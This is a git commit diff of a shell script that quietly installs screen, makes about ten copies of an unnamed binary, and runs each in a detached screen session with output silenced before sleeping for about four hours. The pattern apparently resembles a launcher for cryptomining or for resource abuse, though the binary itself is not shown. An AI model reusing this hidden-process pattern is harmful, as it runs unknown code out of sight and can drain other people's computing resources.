fc61dd8c3495a4e39a858780b483ec5fabcee72b
McgeeLucia1970 <eliham2132@outlook.com>
2024-12-03 05:23:35 +1100

    Update taudah.sh

--- taudah.sh
+++ taudah.sh
@@ -1,22 +1,23 @@
 sudo apt install screen -y >/dev/null 2>&1 
-cp taudah taudah1
-cp taudah taudah2
-cp taudah taudah3
-cp taudah taudah4
-cp taudah taudah5
-cp taudah taudah6
-cp taudah taudah7
-cp taudah taudah8
-cp taudah taudah9
+cp done done1
+cp done done2
+cp done done3
+cp done done4
+cp done done5
+cp done done6
+cp done done7
+cp done done8
+cp done done9
+cp done done10
 sleep 5
-screen -dmS taudah ./taudah z >/dev/null 2>&1 
-screen -dmS taudah1 ./taudah1 z >/dev/null 2>&1 
-screen -dmS taudah2 ./taudah2 z >/dev/null 2>&1 
-screen -dmS taudah3 ./taudah3 z >/dev/null 2>&1 
-screen -dmS taudah4 ./taudah4 z >/dev/null 2>&1 
-screen -dmS taudah5 ./taudah5 z >/dev/null 2>&1 
-screen -dmS taudah6 ./taudah6 z >/dev/null 2>&1 
-screen -dmS taudah7 ./taudah7 z >/dev/null 2>&1 
-screen -dmS taudah8 ./taudah8 z >/dev/null 2>&1 
-screen -dmS taudah9 ./taudah9 z >/dev/null 2>&1
+screen -dmS done ./done z >/dev/null 2>&1 
+screen -dmS done1 ./done1 z >/dev/null 2>&1 
+screen -dmS done2 ./done2 z >/dev/null 2>&1 
+screen -dmS done3 ./done3 z >/dev/null 2>&1 
+screen -dmS done4 ./done4 z >/dev/null 2>&1 
+screen -dmS done5 ./done5 z >/dev/null 2>&1 
+screen -dmS done6 ./done6 z >/dev/null 2>&1 
+screen -dmS done7 ./done7 z >/dev/null 2>&1 
+screen -dmS done8 ./done8 z >/dev/null 2>&1 
+screen -dmS done9 ./done9 z >/dev/null 2>&1
 sleep 14440
